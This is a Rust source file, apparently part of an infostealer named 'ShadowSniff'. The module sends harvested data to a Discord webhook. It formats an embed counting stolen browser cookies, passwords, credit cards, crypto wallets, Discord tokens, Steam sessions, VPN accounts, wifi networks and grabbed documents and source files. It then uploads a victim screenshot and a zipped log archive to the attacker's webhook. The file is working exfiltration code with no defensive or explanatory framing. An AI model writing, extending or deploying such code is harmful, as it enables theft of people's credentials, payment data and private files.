use crate::{LogFile, LogSender, SendError};
use alloc::string::{String, ToString};
use alloc::sync::Arc;
use alloc::{format, vec};
use collector::{Browser, Collector, Device, FileGrabber, Software, Vpn};
use derive_new::new;
use indoc::formatdoc;
use requests::{BodyRequestBuilder, MultipartBuilder, Request, RequestBuilder};
use utils::format_size;

#[derive(Clone, new)]
pub struct DiscordWebhook {
    webhook: Arc<str>
}

fn generate_embed<P, C>(log: &LogFile, password: Option<P>, collector: &C) -> String
where
    P: AsRef<str>,
    C: Collector
{
    let link = match log {
        LogFile::ExternalLink((link, size)) => Some(
            format!(
                r#"[Download [{size}]]({link})"#,
                size = format_size(*size as _)
            )
        ),
        LogFile::ZipArchive(_) => None
    };

    let password = password.map(|password| {
        let password = password.as_ref();
        format!(r#"Password: ||{password}||"#)
    });

    let mut parts = vec![];
    if let Some(l) = link { parts.push(l); }
    if let Some(p) = password { parts.push(p); }
    let description = if parts.is_empty() { "".to_string() } else { parts.join("\\n") };

    formatdoc! {r#"
        {{
          "title": "New log",
          "description": "{description}",
          "color": 14627378,
          "fields": [
            {{
              "name": "Browser",
              "value": "```\nCookies: {cookies}\nPasswords: {passwords}\nCredit cards: {credit_cards}\nAuto fills: {auto_fills}\nHistory: {history}\nBookmarks: {bookmarks}\nDownloads: {downloads}\n```",
              "inline": true
            }},
            {{
              "name": "Software",
              "value": "```\nWallets: {wallets}\nFtp hosts: {ftp_hosts}\nTelegram: {telegram}\nDiscord tokens: {discord_tokens}\nSteam sessions: {steam_sessions}\n```",
              "inline": true
            }},
            {{
              "name": "Files",
              "value": "```\nSource code: {source_code}\nDatabase: {databases}\nDocuments: {documents}\n```"
            }},
            {{
              "name": "Vpn",
              "value": "```\nAccounts: {vpn_accounts}\n```"
            }},
            {{
              "name": "Device",
              "value": "```\nWifi networks: {wifi_networks}\n```"
            }}
          ],
          "author": {{
            "name": "ShadowSniff"
          }},
          "footer": {{
            "text": "ShadowSniff"
          }}
        }}
        "#,
        cookies = collector.get_browser().get_cookies(),
        passwords = collector.get_browser().get_passwords(),
        credit_cards = collector.get_browser().get_credit_cards(),
        auto_fills = collector.get_browser().get_auto_fills(),
        history = collector.get_browser().get_history(),
        bookmarks = collector.get_browser().get_bookmarks(),
        downloads = collector.get_browser().get_downloads(),

        wallets = collector.get_software().get_wallets(),
        ftp_hosts = collector.get_software().get_ftp_hosts(),
        telegram = collector.get_software().is_telegram(),
        discord_tokens = collector.get_software().get_discord_tokens(),
        steam_sessions = collector.get_software().get_steam_session(),

        source_code = collector.get_file_grabber().get_source_code_files(),
        databases = collector.get_file_grabber().get_database_files(),
        documents = collector.get_file_grabber().get_documents(),

        vpn_accounts = collector.get_vpn().get_accounts(),

        wifi_networks = collector.get_device().get_wifi_networks()
    }
}

impl LogSender for DiscordWebhook {
    fn send<P, C>(&self, log_file: LogFile, password: Option<P>, collector: &C) -> Result<(), SendError>
    where
        P: AsRef<str> + Clone,
        C: Collector
    {
        if let LogFile::ZipArchive(archive) = &log_file
            && archive.len() == 8 * 1024 * 1024 // 8 MB
        {
            return Err(SendError::LogFileTooBig)
        }

        let mut builder = MultipartBuilder::new("----Multipart");
        if let Some(screenshot) = collector.get_device().get_screenshot() {
            builder.write_file_field("file", "screenshot.png", "image/png", &screenshot);
        }

        builder.write_text_field("payload_json", r#"{"content": ""}"#);

        let content_type = builder.content_type();
        let body = builder.finish();

        Request::post(self.webhook.to_string())
            .header("Content-Type", &content_type)
            .body(body)
            .build()
            .send()
            .ok()
            .ok_or(SendError::Network)?;

        let payload = formatdoc! {r#"
            {{
                "content": "",
                "embeds": [
                    {embed}
                ]
            }}
            "#,
            embed = generate_embed(&log_file, password, collector),
        };

        let mut builder = MultipartBuilder::new("----Multipart");
        if let LogFile::ZipArchive(archive) = log_file {
            builder.write_file_field("file", "log.zip", "application/zip", &archive);
        }

        builder.write_text_field("payload_json", &payload);

        let content_type = builder.content_type();
        let body = builder.finish();

        Request::post(self.webhook.to_string())
            .header("Content-Type", &content_type)
            .body(body)
            .build()
            .send()
            .ok()
            .ok_or(SendError::Network)?;

        Ok(())
    }
}